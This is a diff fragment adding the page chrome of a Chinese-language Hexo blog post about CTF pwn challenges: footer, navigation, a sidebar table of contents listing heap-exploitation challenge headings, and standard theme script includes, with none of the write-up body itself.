+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/03/starctf-2019-heap-master/" rel="next" title="starctf 2019 heap_master">
+                <i class="fa fa-chevron-left"></i> starctf 2019 heap_master
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#沉睡的敦煌–pwn"><span class="nav-number">1.</span> <span class="nav-text">沉睡的敦煌–pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目描述"><span class="nav-number">2.</span> <span class="nav-text">题目描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目漏洞-amp-利用过程"><span class="nav-number">2.1.</span> <span class="nav-text">题目漏洞 &amp; 利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绝地逃生–fastheap"><span class="nav-number">3.</span> <span class="nav-text">绝地逃生–fastheap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-1"><span class="nav-number">3.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#线程堆"><span class="nav-number">3.2.</span> <span class="nav-text">线程堆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程"><span class="nav-number">3.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
